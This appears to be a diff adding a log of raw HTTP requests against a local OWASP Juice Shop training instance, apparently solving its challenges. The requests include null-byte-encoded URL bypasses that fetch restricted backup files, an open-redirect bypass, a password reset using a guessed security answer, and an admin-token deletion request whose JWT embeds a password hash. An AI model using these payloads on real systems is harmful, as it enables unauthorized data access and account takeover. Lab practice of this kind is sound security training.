@@ -1,0 +1,319 @@
+GET /ftp/suspicious_errors.yml%25%30%30.md HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oEuNt1UBHPhgtyTNFYHku8iDgul8TrDip3fZjH7gt9Kc4ZSWaURriyNSovUa6hkztJJIoYseaibVfOEUmoHXv
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+
+
+
+GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=nKuptyUeHwhvteT2FRHgu3izxuvqijPfyMH6vtLbc56SbYUZliERSmlUB7hJrtwwIQ4snEi3xtQlUlkHVb
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+
+
+
+GET /ftp/coupons_2013.md.bak%25%30%30.md HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=44uot4UYHah7TzFBH5iryuoniOvfQ5HlWtKkcrwS4euQBiwnS8Osr1hwYtPPIEkHeyiYwfwyU19sJ2
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+
+
+
+GET /ftp/package.json.bak%25%30%30.md HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=84uvtJUxHbh5TqFLiKbueziaEf3ZHa6tWYcR5Sz9UB1ix7SEvUgmhN5tmmIDPh2WCBDIWVH6W
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+
+
+GET /redirect?to=example.com?redirect=http://shop.spreadshirt.de/juiceshop HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oEuNt1UBHPhaToFXi2JuNqiglfDRHlxtrycp8SZyU7DF9Rs4Mhz5t66uXnsB6TmpfkxHJw
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+
+
+
+GET /rest/captcha/ HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=LMtXUKHLhXT8FDiyxum7ib6fmYH4ztJjcK3SvRUezij1hnKtrrI6RIk4imBfQJHn6
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+If-None-Match: W/"2f-2uaqOkMhOOrDEwimRLCx+0LYkSs"
+
+
+
+
+POST /api/Feedbacks/ HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/json
+
+Content-Length: 85
+
+Origin: http://localhost:3000
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=LMtXUKHLhXT8FDiyxum7ib6fmYH4ztJjcK3SvRUezij1hnKtrrI6RIk4imBfQJHn6
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+
+
+{"captchaId":2,"captcha":"12","comment":"weak algorithm: md5 (anonymous)","rating":1}
+
+
+
+
+
+
+
+POST /rest/user/reset-password HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/json
+
+Content-Length: 80
+
+Origin: http://localhost:3000
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=LMtXUKHLhXT8FDiyxum7ib6fmYH4ztJjcK3SvRUezij1hnKtrrI6RIk4imBfQJHn6
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+
+
+{"email":"emma@juice-sh.op","answer":"ITsec","new":"pass123","repeat":"pass123"}
+
+
+
+
+DELETE /api/Feedbacks/1 HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NDc2MjI0NiwiZXhwIjoxNjg0NzgwMjQ2fQ.APMiRpJ-yqb7LeyVVmFroTSJufJGbH7SOoqE53kB9dxtVSOVWxGip8Gnb9ZALvUaUS3tGyRAfKcsgdUzhoz0bszyMpxpxLCZOMfDw2gQtm-wNaMElcuKUL2MsiA4omUgd_zqSmxQYsxLySakNtnR_0ixQXdHmCakVKo8A5auJ6w
+
+Origin: http://localhost:3000
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=qG7ot7UQH3hJTkiXjuqXiLkfnJHDYt1BHWOSPJUr7hDvcRRI9Nclzi2vunaG; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NDc2MjI0NiwiZXhwIjoxNjg0NzgwMjQ2fQ.APMiRpJ-yqb7LeyVVmFroTSJufJGbH7SOoqE53kB9dxtVSOVWxGip8Gnb9ZALvUaUS3tGyRAfKcsgdUzhoz0bszyMpxpxLCZOMfDw2gQtm-wNaMElcuKUL2MsiA4omUgd_zqSmxQYsxLySakNtnR_0ixQXdHmCakVKo8A5auJ6w
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+
+
+
+
+
+
+
+GET /.well-known/security.txt HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oPJXWEAqXUVHYhlTjib5uVRiBvHklc17i8vTy2tvvIp2s93FvXHEY07ywQ1B
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+
+
+
+
+
+
+
+
